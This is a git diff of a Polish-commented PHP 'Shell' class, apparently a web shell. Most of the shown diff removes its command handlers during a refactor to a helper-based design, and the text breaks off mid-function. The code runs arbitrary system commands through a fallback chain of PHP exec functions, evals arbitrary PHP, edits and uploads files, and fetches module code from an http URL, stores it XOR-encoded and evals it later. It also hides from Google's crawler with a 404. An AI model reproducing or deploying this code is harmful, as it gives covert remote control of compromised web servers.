@@ -9,12 +9,29 @@
  * @license   http://www.gnu.org/licenses/gpl-3.0.txt
  */
 
+/*
+Required modules:
+- Modules
+- Cr3d1ts
+- Help Autoload
+- Evel
+- Cd
+- System
+- Edit
+- Logout
+-- Version
+-- Upload
+-- Info
+
+*/
+
 require_once dirname(__FILE__) . '/Arr.php';
 require_once dirname(__FILE__) . '/Request.php';
 require_once dirname(__FILE__) . '/ModuleAbstract.php';
 require_once dirname(__FILE__) . '/LoadModules.php';
 require_once dirname(__FILE__) . '/XRecursiveDirectoryIterator.php';
 require_once dirname(__FILE__) . '/Args.php';
+require_once dirname(__FILE__) . '/Utils.php';
 
 /**
  * class Shell - Zarzadzanie serwerem
@@ -35,79 +52,34 @@ class Shell
     /**
      * Wersja
      */
-    const VERSION = '0.60-dev';
-
-    /**
-     * Help, natywne polecenia
-     */
-    const HELP = "help - Wyświetlanie pomocy\r\nmodules - Informacje o modułach\r\nedit - Edycja oraz tworzenie nowego pliku\r\nupload - Wrzucanie pliku na serwer\r\nsystem, exec - Uruchomienie polecenia systemowego\r\ninfo - Wyświetla informacje o systemie\r\nautoload - Automatyczne wczytywanie rozszerzeń PHP\r\neval, php - Wykonanie kodu PHP\r\ncd - Zmiana aktualnego katalogu\r\nversion - Wyświetlanie numeru wersji shella\r\nexit, quit, logout - Wylogowanie z shella (jeśli ustawiono dostęp na hasło)\r\ncr3d1ts - Informacje o autorze\r\n";
+    const VERSION = '1.0.0-dev';
 
     /**
      * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
      *
      * format: sha1( $sUser . "\xff" . $sPass );
      *
-     * @access private
+     * @access protected
      * @var    string
      */
-    private $sAuth;
+    protected $sAuth;
 
     /**
      * Czas generowania strony
      *
-     * @access private
+     * @access protected
      * @var    float
      */
-    private $fGeneratedIn;
-
-    /**
-     * Czy jest wlaczone SafeMode?
-     *
-     * @access protected
-     * @var    boolean
-     */
-    protected $bSafeMode;
-
-    /**
-     * Czy dzialamy w srodowisku Windows?
-     *
-     * @access protected
-     * @var    boolean
-     */
-    protected $bWindows = FALSE;
-
-    /**
-     * Mozliwe jest wykonanie polecenia systemowego?
-     *
-     * @access private
-     * @var    boolean
-     */
-    private $bExec = FALSE;
-
-    /**
-     * Tablica wylaczaonych funkcji
-     *
-     * @access private
-     * @var    array
-     */
-    private $aDisableFunctions = array();
+    protected $fGeneratedIn;
 
     /**
      * Nazwa polecenie
      * ':test' => 'test'
      *
-     * @access public
+     * @access protected
      * @var    string
      */
-    public $sCmd;
-
-    /**
-     * Ciag jako jeden wielki parametr
-     *
-     * @access public
-     * @var    string
-     */
-    public $sArgv;
+    protected $sCmd;
 
     /**
      * Parsowanie argumentow
@@ -118,95 +90,12 @@ class Shell
     protected $oArgs;
 
     /**
-     * Lista modulow i komend
+     * Zestaw narzędzie
      *
-     *  [komenda1] => Modul1
-     *  [komenda2] => Modul2
-     *
-     * @access private
-     * @var    string
+     * @access protected
+     * @ver    object
      */
-    private $aModules = array();
-
-    /**
-     * Lista natywnych modulow
-     *
-     *  [komenda1] => nazwa_metody1
-     *  [komenda2] => nazwa_metody1
-     *
-     * @access private
-     * @var    string
-     */
-    private $aNativeModules = array();
-
-    /**
-     * Lista modulow
-     *
-     *  [Modul] => 'komenda1, komenda2'
-     *
-     * @access private
-     * @var    string
-     */
-    private $aHelpModules = array();
-
-    /**
-     * Style CSS
-     *
-     * @ignore
-     * @access private
-     * @var    string
-     */
-    private $sStyleSheet;
-
-    /**
-     * Katalog tymczasowy
-     *
-     * @access public
-     * @var    string
-     */
-    public $sTmp;
-
-    /**
-     * Funkcje systemowe
-     *
-     * @access public
-     * @var    array
-     */
-    public $aSystemFunctions = array(
-        'exec',
-        'shell_exec',
-        'passthru',
-        'system',
-        'popen',
-        'proc_open'
-    );
-
-    /**
-     * Wlasciwosc potrzeba przy wyswietlaniu pliku pomocy z natywnych modulow
-     * takich jak getCommandEdit(), getCommandUpload() czy getCommandSystem()
-     *
-     * @access private
-     * @var    boolean
-     */
-    private $bHelp = FALSE;
-
-    /**
-     * Unikalny klucz dla shella, za pomoca ktorego szyfrowane sa niektore dane
-     *
-     * @ignore
-     * @access public
-     * @var    string
-     */
-    public $sKey;
-
-    /**
-     * Specjalny prefix dla shella
-     *
-     * @ignore
-     * @access public
-     * @var    string
-     */
-    public $sPrefix;
+    protected $oUtils;
 
     /**
      * Jezeli TRUE to dzialamy w srodowisku deweloperskim (wlaczane wyswietlanie i raportowanie bledow)
@@ -214,6 +103,7 @@ class Shell
      * @access public
      * @var    boolean
      */
+    protected $bDev = FALSE;
 
     /**
      * Jezeli FALSE to skrypty JavaScript sa wlaczone
@@ -221,7 +111,7 @@ class Shell
      * @access public
      * @var    boolean
      */
-    public $bNoJs = FALSE;
+    protected $bNoJs = FALSE;
 
     /**
      * Konstruktor
@@ -231,12 +121,17 @@ class Shell
      * @access public
      * @return void
      */
-    public function __construct()
+    public function __construct($sArgs = NULL)
     {
         /**
          * Czas generowania strony a w zasadzie shella
          */
         $this->fGeneratedIn = microtime(1);
+
+        $this->sArgs = $sArgs;
+
+        $this->oUtils = new Utils();
+        $this->oArgs = new Args($this->sArgs);
 
         /**
          * Uwierzytelnianie
@@ -260,7 +155,7 @@ class Shell
         /**
          * Blokowanie google bota; baidu, bing, yahoo moga byc
          */
-        if (stripos(Request::getServer('HTTP_USER_AGENT'), 'Google') !== FALSE) {
+        if ($this->oUtils->isUserAgentOnBlacklist(Request::getServer('HTTP_USER_AGENT'))) {
             header('HTTP/1.0 404 Not Found');
             exit;
         }
@@ -278,32 +173,6 @@ class Shell
         }
 
         /**
-         * @ignore
-         */
-        if (PHP_SAPI !== 'cli') {
-            $this->sStyleSheet = file_get_contents(dirname(Request::getServer('SCRIPT_FILENAME')) . '/Styles/haxior.css');
-        }
-
-        /**
-         *  Sprawdzanie do ktorego katalogu mamy zapis
-         */
-        $aTmpDirs = array(
-            @ $_ENV['TMP'],
-            @ $_ENV['TMPDIR'],
-            ini_get('session.save_path') .
-            ini_get('upload_tmp_dir'),
-            ini_get('soap.wsdl_cache_dir'),
-            sys_get_temp_dir()
-        );
-
-        foreach ($aTmpDirs as $sTmpDir) {
-            if (is_readable($sTmpDir) && is_writable($sTmpDir)) {
-                $this->sTmp = $sTmpDir;
-                break;
-            }
-        }
-
-        /**
          * Tryb deweloperski
          */
         $this->bDev = isset($_GET['dev']);
@@ -313,58 +182,20 @@ class Shell
          */
         $this->bNoJs = isset($_GET['nojs']);
 
-        /**
-         * disable_functions
-         */
-        if (($sDisableFunctions = ini_get('disable_functions')) !== '') {
-            $aDisableFunctions = explode(',', $sDisableFunctions);
-
-            $this->aDisableFunctions = array_map(create_function('$sValue', 'return strtolower( trim( $sValue ) );'), $aDisableFunctions);
-        }
-
-        /**
-         * Czy dzialamy na Windowsie ?
-         */
-        $this->bWindows = (strncmp(PHP_OS, 'WIN', 3) === 0);
-
-        /**
-         * SafeMode
-         */
-        $this->bSafeMode = (boolean)ini_get('safe_mode');
-
-        /**
-         * Unikalny klucz
-         */
-        $this->sKey = md5(md5_file($sScriptFilename = Request::getServer('SCRIPT_FILENAME')), TRUE) . md5($sScriptFilename, TRUE) . sha1($sScriptFilename, TRUE);
-
-        /**
-         * Prefix
-         */
-        $this->sPrefix = substr(md5($sScriptFilename) . md5_file($sScriptFilename), 0, 10) . '_';
-
-        /**
-         * Mozliwosc wywolania polecenia systemowego
-         */
-        if (function_exists('pcntl_exec')) {
-            $this->aSystemFunctions[] = 'pcntl_exec';
-        }
-
-        $this->bExec = (!$this->bSafeMode && (count(array_diff($this->aSystemFunctions, $this->aDisableFunctions)) > 0));
 
         /**
          * Config
          */
-        error_reporting($this->bDev ? -1 : 0);
+        $this->loadDevConfig();
         ignore_user_abort(0);
 
         /**
          * Jesli SafeMode jest wylaczony
          */
-        if (!$this->bSafeMode) {
-            ini_set('display_errors', (int)$this->bDev);
+        if (!$this->oUtils->isSafeMode()) {
             ini_set('max_execution_time', 0);
             ini_set('memory_limit', '1024M');
-            ini_set('default_socket_timeout', 5);
+            ini_set('default_socket_timeout', 15);
             ini_set('date.timezone', 'Europe/Warsaw');
             ini_set('html_errors', 0);
             ini_set('log_errors', 0);
@@ -378,165 +209,51 @@ class Shell
          * bez rozszerzen i modulow
          */
         if (!isset($_GET['pure'])) {
-            /**
-             * Wczytywanie modulow
-             */
-            if (is_file($sFilePath = $this->sTmp . '/' . $this->sPrefix . '_modules')
-                && (($sData = file_get_contents($sFilePath)) !== FALSE)
-            ) {
-                ob_start();
-                eval('?>' . $this->decode($sData) . '<?');
-                ob_clean();
-                ob_end_flush();
-            }
+            $this->loadModulesFromFile();
+        }
 
+        if ($sDir = $this->oUtils->cacheGet('chdir')) {
+            @ chdir($sDir);
+        }
+    }
+
+    /**
+     * Set display_errors and error_reporting
+     */
+    protected function loadDevConfig()
+    {
+        ini_set('display_errors', (int) $this->bDev);
+        error_reporting($this->bDev ? -1 : 0);
+    }
+
+    /**
+     * Load modules from user space
+     */
+    protected function loadModulesFromFile()
+    {
+        $sTmp = $this->oUtils->getTmpDir();
+
+        /**
+         * Wczytywanie modulow
+         */
+        if ($sData = $this->oUtils->cacheGet('modules')) {
+            ob_start();
+            eval('?>' . $sData . '<?');
+            ob_clean();
+            ob_end_flush();
+        }
+
+        /**
+         * Wczytywanie rozszerzen
+         */
+        if ($aAutoload = $this->oUtils->cacheGet('autoload')) {
             /**
              * Wczytywanie rozszerzen
              */
-            if (is_file($sFilePath = $this->sTmp . '/' . $this->sPrefix . '_autoload')
-                && (($sData = file_get_contents($sFilePath)) !== FALSE)
-            ) {
-                /**
-                 * Unserializacja i deszyfrowanie
-                 */
-                $aAutoload = unserialize($this->decode($sData));
-
-                /**
-                 * Wczytywanie rozszerzen
-                 */
-                foreach ($aAutoload as $sExtension) {
-                    $this->dl($sExtension);
-                }
+            foreach ($aAutoload as $sExtension) {
+                $this->dl($sExtension);
             }
         }
-
-        /**
-         * Lista dostepnych modulow natywnych
-         */
-        $oReflection = new ReflectionClass('shell');
-        $aHelpModules = $oReflection->getMethods();
-
-        foreach ($aHelpModules as $oMethod) {
-            $sMethod = $oMethod->getName();
-
-            if (!((strncasecmp($sMethod, 'getCommand', 10) === 0) && ($sMethod !== 'getCommandCr3d1ts'))) {
-                continue;
-            }
-            $this->aNativeModules[strtolower(substr($sMethod, 10))] = $sMethod;
-        }
-
-        /**
-         * Lista dostepnych modulow zewnetrznych
-         */
-        $aClasses = get_declared_classes();
-
-        foreach ($aClasses as $sClass) {
-            /**
-             * Wyszukiwanie klas z prefixem Module
-             */
-            if ((strncmp($sClass, 'Module', 6) === 0) && ($sClass !== 'ModuleDummy') && ($sClass !== 'ModuleAbstract')) {
-                $oModule = new $sClass($this);
-
-                /**
-                 * Klasa musi implementowac ModuleAbstract
-                 */
-                if ($oModule instanceof ModuleAbstract) {
-                    $aCommands = $oModule->getCommands();
-
-                    foreach ($aCommands as $sCommand) {
-                        $this->aModules[$sCommand] = $sClass;
-                    }
-
-                    $this->aHelpModules[$sClass] = implode(', ', $aCommands);
-                }
-            }
-        }
-
-        /**
-         * Chdir
-         */
-        if (is_file($sFile = $this->sTmp . '/' . $this->sPrefix . 'chdir')
-            && (($sData = file_get_contents($sFile)) !== FALSE)
-        ) {
-            @ chdir($this->decode($sData));
-        }
-    }
-
-    /**
-     * Proste szyfrowanie ciągu z uzyiem XOR
-     *
-     * @param  string $sData Tekst do zaszyfrowania
-     * @param  string $sKey [Optional]Klucz
-     * @return string        Zaszyfrowany ciag
-     */
-    public function encode($sData, $sKey = NULL)
-    {
-        /**
-         * Domyslny klucz
-         */
-        if ($sKey === NULL) {
-            $sKey = $this->sKey;
-        }
-
-        /**
-         * Musza wystepowac jakies dane
-         */
-        if (($iDataLen = strlen($sData)) === 0) {
-            return NULL;
-        }
-
-        $iKeyLen = strlen($sKey);
-
-        $sNewData = NULL;
-
-        /**
-         * Szyfrowanie
-         */
-        for ($i = 0; $i < $iDataLen; ++$i) {
-            $sNewData .= chr(ord(substr($sData, $i, 1)) ^ ord(substr($sKey, $i % $iKeyLen, 2)));
-        }
-
-        return gzcompress($sNewData, 9);
-    }
-
-    /**
-     * Proste deszyfrowanie ciągu z uzyiem XOR
-     *
-     * @param  string $sData Tekst do deszyfracji
-     * @param  string $sKey [Optional]Klucz
-     * @return string        Zdeszyfrowany ciag
-     */
-    public function decode($sData, $sKey = NULL)
-    {
-        /**
-         * Domyslny klucz
-         */
-        if ($sKey === NULL) {
-            $sKey = $this->sKey;
-        }
-
-        /**
-         * Musza wystepowac jakies dane
-         */
-        if (strlen($sData) === 0) {
-            return NULL;
-        }
-
-        $sData = gzuncompress($sData);
-        $iDataLen = strlen($sData);
-
-        $iKeyLen = strlen($sKey);
-
-        $sNewData = NULL;
-
-        /**
-         * Deszyfrowanie
-         */
-        for ($i = 0; $i < $iDataLen; ++$i) {
-            $sNewData .= chr(ord(substr($sData, $i, 1)) ^ ord(substr($sKey, $i % $iKeyLen, 2)));
-        }
-
-        return $sNewData;
     }
 
     /**
@@ -556,12 +273,9 @@ class Shell
         if (($iPos = strrpos($sName, '.')) !== FALSE) {
             $sName = substr($sName, 0, $iPos - 1);
         } else {
-            $sExtension .= ($this->bWindows ? '.dll' : '.so');
+            $sExtension .= ($this->oUtils->isWindows() ? '.dll' : '.so');
         }
 
-        /**
-         * Czy rozszerzenie jest juz zaladowane
-         */
         if (extension_loaded($sName)) {
             return TRUE;
         }
@@ -571,28 +285,13 @@ class Shell
          * wlaczenie dyrektywy enable_dl. Funkcja `dl` musi istniec
          * i nie moze znajdowac sie na liscie wylaczonych funkcji
          */
-        if (!$this->bSafeMode && function_exists('dl') && ini_get('enable_dl') && !in_array('dl', $this->aDisableFunctions)) {
+        if (!$this->oUtils->isSafeMode() && function_exists('dl') && ini_get('enable_dl')
+            && !in_array('dl', $this->oUtils->getDisabledFunctions())
+        ) {
             return dl($sExtension);
         }
 
         return FALSE;
-    }
-
-    /**
-     * Zwracanie nazwy hosta i portu
-     *
-     * @access private
-     * @param  integer $sHost Host / Host:port
-     * @return array          Host i port
-     */
-    public function getHost($sHost)
-    {
-        $iPort = 0;
-        if (strpos($sHost, ':') !== FALSE) {
-            list($sHost, $iPort) = explode(':', $sHost);
-        }
-
-        return array($sHost, (int)$iPort);
     }
 
     /**
@@ -625,678 +324,12 @@ class Shell
             'Zablokowane funkcje: <strong>%s</strong><br/>',
 
             phpversion(),
-            $this->getStatus($this->bSafeMode, TRUE),
+            $this->getStatus($this->oUtils->isSafeMode(), TRUE),
             ((($sBasedir = ini_get('open_basedir')) === '') ? $this->getStatus(0, TRUE) : $sBasedir),
             php_sapi_name(),
             php_uname(),
-            $this->sTmp,
-            (($sDisableFunctions = implode(',', $this->aDisableFunctions) === '') ? 'Brak' : $sDisableFunctions)
-        );
-    }
-
-    /**
-     * Komenda - modules
-     *
-     * @access private
-     * @return string
-     */
-    private function getCommandModules()
-    {
-        $iArgc = $this->oArgs->getNumberOfParams();
-        $sParam = $this->oArgs->getParam(0);
-
-        /**
-         * Help
-         */
-        if ($this->bHelp || ($iArgc !== 1) || ($sParam === 'help')) {
-            return <<<DATA
-modules - Informacje o modułach
-
-	Użycie:
-		modules loaded - lista załadowanych modułów - polecenia
-		modules version - wyświetlanie wersji modułów
-
-		modules ścieżka_do_pliku_z_modułami
-
-	Przykład:
-		modules loaded
-		modules version
-		modules /tmp/modules
-		modules http://example.com/modules.txt
-DATA;
-        }
-
-        /**
-         * Lista dostepnych modulow
-         */
-        if (($iArgc === 1) && ($sParam === 'loaded')) {
-            $aModules = array_merge(array_keys($this->aNativeModules),
-                array_map(
-                    create_function('$sVal', 'return strtolower( substr( $sVal, 6 ) );'), array_keys($this->aHelpModules)
-                )
-            );
-
-            sort($aModules);
-
-            return sprintf("Załadowano %s modułów:\r\n\t%s", count($aModules), implode("\r\n\t", $aModules));
-        }
-
-        /**
-         * Wyswietlanie wersji bibliotek
-         */
-        if (($iArgc === 1) && ($sParam === 'version')) {
-            /**
-             * Szukanie najdluzszej nazwy modulu
-             */
-            $iMaxLen = 0;
-            foreach ($this->aHelpModules as $sModule => $sModuleCmd) {
-                if (($iLen = strlen($sModule)) > $iMaxLen) {
-                    $iMaxLen = $iLen;
-                }
-            }
-
-            /**
-             * Wersja modulu
-             */
-            $sOutput = NULL;
-            foreach ($this->aHelpModules as $sModule => $sModuleCmd) {
-                $oModule = new $sModule($this);
-
-                $sOutput .= str_pad($sModule, $iMaxLen, ' ') . ' - ' . $oModule->getVersion() . "\r\n";
-            }
-
-            return htmlspecialchars($sOutput);
-        }
-
-        /**
-         * Pobieranie pliku z http
-         */
-        if (strncmp($sParam, 'http://', 7) === 0) {
-            if (($sData = file_get_contents($sParam)) === FALSE) {
-                return 'Nie można pobrać pliku z modułami';
-            }
-        } /**
-         * Wczytywanie pliku
-         */
-        else {
-            if (!(is_file($sParam) && (($sData = file_get_contents($sParam)) !== FALSE))) {
-                return 'Nie można wczytać pliku z modułami';
-            }
-        }
-
-        /**
-         * Szyfrowanie zawartosci pliku
-         */
-        file_put_contents($this->sTmp . '/' . $this->sPrefix . '_modules', $this->encode($sData));
-
-        header('Refresh:1;url=' . Request::getCurrentUrl());
-
-        return 'Plik z modułami został załadowany';
-    }
-
-    private function getCommandCr3d1ts()
-    {
-        return <<<DATA
-Jakieś sugestie, pytania?
-	Pisz śmiało: Krzychu - <a href="mailto:krzotr@gmail.com">krzotr@gmail.com</a>
-DATA;
-    }
-
-    /**
-     * Komenda - help
-     *
-     * @access private
-     * @return string
-     */
-    private function getCommandHelp()
-    {
-        if ($this->bHelp) {
-            return <<<DATA
-help - Wyświetlanie pomocy
-
-	Użycie:
-		help
-DATA;
-        }
-
-        $iMaxLen = 0;
-
-        /**
-         * Szukanie najdluzszego ciagu (najdluzsza komenda)
-         */
-        foreach ($this->aHelpModules as $sModuleCmd) {
-            if (($iLen = strlen($sModuleCmd)) > $iMaxLen) {
-                $iMaxLen = $iLen;
-            }
-        }
-
-        $sOutput = NULL;
-
-        /**
-         * Formatowanie natywnego helpa
-         */
-        $aHelp = array_filter(preg_split('~\r\n|\n|\r~', self::HELP));
-
-        /**
-         * Szukanie najdluzszego ciagu (najdluzsza komenda)
-         */
-        if ($iMaxLen === 0) {
-            foreach ($aHelp as $sLine) {
-                if (($iLen = strpos($sLine, '-')) > $iMaxLen) {
-                    $iMaxLen = $iLen;
-                }
-            }
-        }
-
-        /**
-         * Formatowanie naglowkow z natywnych modulow
-         */
-        foreach ($aHelp as $sLine) {
-            $iPos = strpos($sLine, '-');
-
-            $sOutput .= str_pad(substr($sLine, 0, $iPos), $iMaxLen, ' ') . rtrim(substr($sLine, $iPos - 1)) . "\r\n";
-        }
-
-        /**
-         * Formatowanie naglowkow z zewnetrznych modulow
-         */
-        foreach ($this->aHelpModules as $sModule => $sModuleCmd) {
-            $oModule = new $sModule($this);
-
-            $sHelp = $oModule->getHelp();
-
-            $iPos = ((($iPos = strpos($sHelp, "\n")) !== FALSE) ? $iPos : strlen($sHelp));
-            $sOutput .= str_pad($sModuleCmd, $iMaxLen, ' ') . ' - ' . trim(substr($sHelp, 0, $iPos)) . "\r\n";
-        }
-
-        $sOutput .= "\r\n\r\n";
-
-        /**
-         * Wymuszenie uzycia pliku pomocy dla natywnych polecen
-         */
-        $this->bHelp = TRUE;
-
-        $sParam = $this->oArgs->getParam(0);
-
-        /**
-         * Szczegolowa pomoc
-         */
-        if ($sParam === 'all') {
-            /**
-             * Formatowanie natywnych helpow
-             */
-            foreach ($this->aNativeModules as $sModule => $sMethod) {
-                $sOutput .= $this->$sMethod(TRUE) . "\r\n\r\n\r\n";
-            }
-
-            foreach ($this->aHelpModules as $sModule => $sModuleCmd) {
-                $oModule = new $sModule($this);
-
-                $sOutput .= $sModuleCmd . ' - ' . $oModule->getHelp() . "\r\n\r\n\r\n";
-            }
-        }
-
-        /**
-         * Wylaczenie uzycia pliku pomocy dna natywnych polecen
-         */
-        $this->bHelp = FALSE;
-
-        return htmlspecialchars(substr($sOutput, 0, -6));
-    }
-
-    /**
-     * Komenda - autoload
-     *
-     * @access private
-     * @return string
-     */
-    private function getCommandAutoload()
-    {
-        $aSwitches = $this->oArgs->getSwitches();
-
-        if ($this->bHelp || (($this->oArgs->getNumberOfParams() === 0) && ($aSwitches === array()))) {
-            return <<<DATA
-Wczytywanie rozszerzeń PHP
-
-	Rozszerzenia te wczytywane są za każdym razem podczas startu
-
-	Użycie:
-		autoload -l - wyświetlanie rozszerzen, które zostały wczytane
-		autoload -f - odłączenie wszystkich rozszerzen
-		autoload nazwa_rozszerzenia [sciezka_do_rozszerzenia rozszerzenie]
-
-	Przykład:
-		autoload imap
-DATA;
-        }
-
-        /**
-         * Lista poprzednio wczytanych rozszerzen
-         */
-        $aAutoload = array();
-
-        if (is_file($sFilePath = $this->sTmp . '/' . $this->sPrefix . '_autoload')
-            && (($sData = file_get_contents($sFilePath)) !== FALSE)
-        ) {
-            $aAutoload = unserialize($this->decode($sData));
-        }
-
-        /**
-         * List
-         */
-        if (array_key_exists('l', $aSwitches)) {
-            if ($aAutoload === array()) {
-                return 'Nie wczytano żadnych rozszerzeń';
-            }
-
-            /**
-             * Wczytywanie rozszerzen
-             */
-            $sOutput = NULL;
-
-            foreach ($aAutoload as $sExtension) {
-                $sOutput .= $sExtension . "\r\n";
-            }
-
-            return "Wczytane rozszerzenia:\r\n\r\n" . $sOutput;
-        }
-
-        /**
-         * Flush
-         */
-        if (array_key_exists('f', $aSwitches)) {
-            return sprintf('Plik z rozszerzeniami %szostał usunięty', !unlink($this->sTmp . '/' . $this->sPrefix . '_autoload') ? 'nie ' : NULL);
-        }
-
-        /**
-         * Wczytywanie rozszerzen
-         */
-        $sOutput = NULL;
-
-        foreach ($this->oArgs->getParams() as $sExtension) {
-            /**
-             * Czy rozszerzenie zostalo juz poprzednio wczytane
-             */
-            if (in_array($sExtension, $aAutoload)) {
-                $sOutput .= sprintf("Poprzednio wczytany - %s\r\n", $sExtension);
-                continue;
-            }
-
-            /**
-             * Wczytywanie rozszerzenia
-             */
-            if (($bLoaded = $this->dl($sExtension))) {
-                $aAutoload[] = $sExtension;
-            }
-
-            $sOutput .= sprintf("%s - %s\r\n", ($bLoaded ? '    Wczytano' : 'Nie wczytano'), $sExtension);
-        }
-
-        /**
-         * Zapis rozszerzen do pliku
-         */
-        file_put_contents($this->sTmp . '/' . $this->sPrefix . '_autoload', $this->encode(serialize($aAutoload)));
-
-        return $sOutput;
-    }
-
-    /**
-     * Komenda - eval
-     *
-     * @access private
-     * @return string
-     */
-    private function getCommandEval()
-    {
-        if ($this->bHelp || ($this->oArgs->getNumberOfParams() === 0)) {
-            return <<<DATA
-Wykonanie kodu PHP
-
-	Użycie
-		eval skrypt_php
-
-	Przykład
-		eval echo md5( 'test' );
-DATA;
-        }
-
-        ob_start();
-        eval($this->sArgv);
-        $sData = ob_get_contents();
-        ob_clean();
-        ob_end_flush();
-
-        return htmlspecialchars($sData);
-    }
-
-    /**
-     * Komenda - cd
-     *
-     * @access private
-     * @return string
-     */
-    private function getCommandCd()
-    {
-        if ($this->bHelp || ($this->oArgs->getNumberOfParams() < 1)) {
-            return <<<DATA
-Zmiana aktualnego katalogu
-
-	Użycie:
-		cd sciezka
-
-	Przykład:
-		cd /tmp
-DATA;
-        }
-
-        $sDir = $this->oArgs->getParam(0);
-
-        if (@ chdir($sDir)) {
-            file_put_contents($this->sTmp . '/' . $this->sPrefix . 'chdir', $this->encode($sDir));
-
-            return sprintf("Katalog zmieniono na:\r\n\t%s", getcwd());
-        }
-
-        return 'Nie udało się zmienić katalogu!!!';
-    }
-
-    /**
-     * Wykonanie polecenia systemowago
-     *
-     * @access public
-     * @param  string $sCmd Komenda
-     * @return string
-     */
-    public function getCommandSystem($sCmd)
-    {
-        if ($this->bHelp) {
-            return <<<DATA
-system - Uruchomienie polecenia systemowego
-
-	Użycie:
-		system polecenie - uruchomienie polecenia
-
-	Przykład:
-		system ls -la
-DATA;
-        }
-
-        /**
-         * Jezeli safemode jest wylaczony
-         */
-        if (!$this->bSafeMode) {
-            if (strncmp($sCmd, 'cd ', 3) === 0) {
-                chdir(substr($sCmd, 3));
-            }
-
-            ob_start();
-            /**
-             * system
-             */
-            if (!in_array('system', $this->aDisableFunctions)) {
-                echo "system():\r\n\r\n";
-                system($sCmd);
-            } /**
-             * shell_exec
-             */
-            else if (!in_array('shell_exec', $this->aDisableFunctions)) {
-                echo "shell_exec():\r\n\r\n";
-                echo shell_exec($sCmd);
-            } /**
-             * passthru
-             */
-            else if (!in_array('passthru', $this->aDisableFunctions)) {
-                echo "passthru():\r\n\r\n";
-                passthru($sCmd);
-            } /**
-             * exec
-             */
-            else if (!in_array('exec', $this->aDisableFunctions)) {
-                echo "exec():\r\n\r\n";
-                exec($sCmd, $aOutput);
-                echo implode("\r\n", $sLine) . "\r\n";
-            } /**
-             * popen
-             */
-            else if (!in_array('popen', $this->aDisableFunctions)) {
-                echo "popen():\r\n\r\n";
-                $rFp = popen($sCmd, 'r');
-
-                if (is_resource($rFp)) {
-                    while (!feof($rFp)) {
-                        echo fread($rFp, 1024);
-                    }
-                }
-            } /**
-             * proc_open
-             */
-            else if (!in_array('proc_open', $this->aDisableFunctions)) {
-                echo "proc_open():\r\n\r\n";
-                $rFp = proc_open($sCmd, array
-                (
-                    array('pipe', 'r'),
-                    array('pipe', 'w')
-                ),
-                    $aPipe
-                );
-
-                if (is_resource($rFp)) {
-                    while (!feof($aPipe[1])) {
-                        echo fread($aPipe[1], 1024);
-                        usleep(10000);
-                    }
-                }
-            } /**
-             * pcntl_exec
-             */
-            else if (function_exists('pcntl_exec') && !in_array('pcntl_exec', $this->aDisableFunctions)) {
-                echo "pcntl_exec():\r\n\r\n";
-                $sPath = NULL;
-                $aArgs = array();
-                if (($iPos = strpos($sCmd, ' ')) === FALSE) {
-                    $sPath = $sCmd;
-                } else {
-                    $sPath = substr($sCmd, 0, $iPos);
-                    $aArgs = explode(' ', substr($sCmd, $iPos + 1));
-                }
-                pcntl_exec($sPath, $aArgs);
-            } else {
-                echo 'Wszystkie funkcje systemowe są poblokowane !!!';
-            }
-
-            $sData = ob_get_contents();
-            ob_clean();
-            ob_end_flush();
-
-            return htmlspecialchars($sData);
-        }
-
-        return 'Safe mode jest włączone, funkcje systemowe nie działają !!!';
-    }
-
-    /**
-     * Edycja pliku
-     *
-     * @access private
-     * @param  string $sCmd Sciezka do pliku
-     * @return string|boolean
-     */
-    private function getCommandEdit($sFile)
-    {
-        /**
-         * Help
-         */
-        if ($this->bHelp || ($this->oArgs->getNumberOfParams() !== 1) || ($this->oArgs->getParam(0) === 'help')) {
-            return <<<DATA
-edit - Edycja oraz tworzenie nowego pliku
-
-	Użycie:
-		edit /etc/passwd
-		edit /sciezka/do/nowego/pliu
-DATA;
-        }
-
-        /**
-         * Zapis do pliku
-         */
-        if (($sFiledata = Request::getPost('filedata')) !== FALSE) {
-            return (boolean)file_put_contents($sFile, $sFiledata);
-        }
-
-        /**
-         * Formularz
-         */
-        return sprintf('<form action="%s" method="post">' .
-            '<textarea id="console" name="filedata">%s</textarea><br/>' .
-            '<input type="text" name="cmd" value="%s" size="110" id="cmd"/>' .
-            '<input type="submit" name="submit" value="Zapisz" id="cmd-send"/></form>',
-            Request::getCurrentUrl(),
-            ((is_file($sFile) && is_readable($sFile)) ? file_get_contents($sFile) : NULL),
-            htmlspecialchars(Request::getPost('cmd'))
-        );
-    }
-
-    /**
-     * Wylogowanie
-     *
-     * @access private
-     * @return string
-     */
-    private function getCommandLogout()
-    {
-        /**
-         * Help
-         */
-        if ($this->bHelp) {
-            return <<<DATA
-exit, quit, logout - Wylogowanie z shella
-
-	Użycie:
-		logout
-DATA;
-        }
-
-        /**
-         * Sciezka do pliku
-         */
-        $sFilepath = $this->sTmp . '/' . $this->sPrefix . md5(Request::getServer('REMOTE_ADDR') . Request::getServer('USER_AGENT')) . '_auth';
-
-        /**
-         * Czy plik z autoryzacja istnieje
-         */
-        if (is_file($sFilepath)) {
-            /**
-             * Usuwanie pliku
-             */
-            if (unlink($sFilepath)) {
-                echo 'Zostałeś wylogowany';
-                exit;
-            } else {
-                echo 'Nie zostałeś wylogowany';
-                exit;
-            }
-        }
-
-        echo 'See you (:';
-        exit;
-    }
-
-    /**
-     * Version
-     *
-     * @access private
-     * @return string
-     */
-    private function getCommandVersion()
-    {
-        /**
-         * Help
-         */
-        if ($this->bHelp) {
-            return <<<DATA
-version - Wyświetlanie numeru wersji shell'a
-
-	Użycie:
-		version
-DATA;
-        }
-
-        return self::VERSION;
-
-    }
-
-    /**
-     * Wrzucanie pliku
-     *
-     * @access private
-     * @param  string $sCmd Sciezka do pliku
-     * @return string|boolean
-     */
-    private function getCommandUpload($sFile)
-    {
-        /**
-         * Help
-         */
-        if ($this->bHelp || ($this->oArgs->getNumberOfParams() !== 1) || ($this->oArgs->getParam(0) === 'help')) {
-            return <<<DATA
-upload - Wrzucanie pliku na serwer
-
-	Użycie:
-		upload /tmp/plik.php
-DATA;
-        }
-
-        /**
-         * Zapis do pliku
-         */
-        if (($aFiledata = Request::getFiles('file')) !== FALSE) {
-            return move_uploaded_file($aFiledata['tmp_name'], $sFile);
-        }
-        /**
-         * Formularz
-         */
-        return sprintf('<form action="%s" method="post" enctype="multipart/form-data">' .
-            '<pre id="console"><h1>Wrzuć plik</h1><input type="file" name="file"/></pre>' .
-            '<input type="text" name="cmd" value="%s" size="110" id="cmd"/>' .
-            '<input type="submit" name="submit" value="Wrzuć" id="cmd-send"/></form>',
-            Request::getCurrentUrl(),
